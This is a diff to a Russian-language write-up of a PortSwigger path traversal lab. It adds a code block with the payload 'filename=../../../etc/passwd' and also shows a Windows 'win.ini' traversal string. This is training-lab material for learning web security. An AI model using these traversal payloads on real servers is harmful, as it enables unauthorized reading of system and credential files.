@@ -47,7 +47,9 @@ https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
 ![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Directory_traversal/File_path_traversal_simple_case/assets/2.png)
 
 Вместо картинки мы будет отправлять запрос к файлу /etc/passwd.
-
+```
+/image?filename=../../../etc/passwd
+```
 ![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Directory_traversal/File_path_traversal_simple_case/assets/3.png)
 
 Отправляем запрос и получаем ответ от сервера.
